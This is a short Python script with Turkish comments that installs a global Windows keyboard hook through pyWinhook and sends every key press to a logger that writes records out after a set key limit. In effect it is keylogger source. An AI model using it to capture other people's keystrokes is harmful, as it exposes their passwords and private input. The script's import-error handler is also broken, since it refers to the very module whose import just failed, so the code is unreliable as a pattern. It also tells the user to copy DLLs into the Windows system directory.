#!/usr/bin/python
# -*- coding: utf-8 -*-

######################################################
#      PAKETLERI KONTROL ETME VE ÖNERİDE BULUNMA      
######################################################

try:
    import pyWinhook, pygame
    from utils import yLogger, yShortcutHandler, yDebugger
    from utils.yConfig import KEY_LIMIT
except ImportError as ext:
    import os

    path = pyWinhook.__file__
    dllpath = os.path.join(path, "..", "..", "pywin32_system32")
    print("\n", ext)
    print(" DLL dosyaları koypalanmalı!")
    print()
    print("     DLL dosyalarının dizini: ")
    print(f"         {dllpath}")
    print()
    print("     Kopyalanacağı dizin:")
    print("         C:\\Windows\\System32")

    quit()

def OnKeyboardEvent(event):
    yShortcutHandler.handleShortcutPressed(event)
    yLogger.regData(event)
    yLogger.logOnReach(KEY_LIMIT)

    return True

def pumpMessage():
    pygame.init()
    while True:
        pygame.event.pump()

yDebugger.setLogLvl(2)
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pumpMessage()
